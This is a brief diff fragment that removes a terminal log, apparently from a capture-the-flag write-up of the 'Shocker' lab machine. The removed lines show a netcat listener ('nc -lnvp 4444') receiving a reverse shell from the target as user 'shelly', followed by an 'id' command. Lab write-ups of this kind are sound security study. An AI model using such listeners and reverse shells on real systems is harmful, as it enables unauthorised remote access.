@@ -1,16 +1,5 @@
 
 
-hippoeug@kali:~$ sudo nc -lnvp 4444
-[sudo] password for hippoeug: 
-listening on [any] 4444 ...
-connect to [10.10.14.6] from (UNKNOWN) [10.129.139.89] 43852
-bash: no job control in this shell
-shelly@Shocker:/usr/lib/cgi-bin$ id
-id
-uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
-shelly@Shocker:/usr/lib/cgi-bin$ 
-
-
 
 
 
